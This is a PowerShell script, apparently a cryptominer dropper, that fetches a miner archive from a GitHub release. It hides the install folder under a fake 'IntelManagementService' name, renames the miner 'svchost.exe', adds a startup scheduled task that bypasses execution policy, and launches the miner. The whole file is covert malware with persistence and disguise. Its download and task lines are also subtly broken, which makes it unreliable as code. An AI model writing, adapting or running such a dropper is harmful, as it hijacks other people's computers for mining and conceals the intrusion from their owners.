$rawScript = "https://raw.githubusercontent.com/egedmz/Update-Manager/master/code.ps1"

$url = "https://github.com/egedmz/Update-Manager/releases/download/1.4.1/stak.zip"
$myLoc = "$env:homedrive\IntelManagementService"

$outMinerData = "$myLoc\data"
$outMinerFile = "$outMinerData\svchost.exe"
$outZip = "$myLoc\stak.zip"
$outScript = "$myLoc\code.ps1"
Remove-Item –path $myLoc –recurse -Force
mkdir $myLoc
attrib +h +r +s +a $myLoc /d /s

(New-Object System.Net.WebClient).DownloadFile($url,$outZip)
(New-Object System.Net.WebClient).DownloadFile($url,$outScript)

Expand-Archive $outZip -DestinationPath $myLoc\data -Force
Remove-Item -path $outZip -Force

$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File $outScript'

$trigger =  New-ScheduledTaskTrigger  -AtStartup

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Code" -Description "Just Code"

Start-Process -FilePath $outMinerFile -NoNewWindow -WorkingDirectory $outMinerData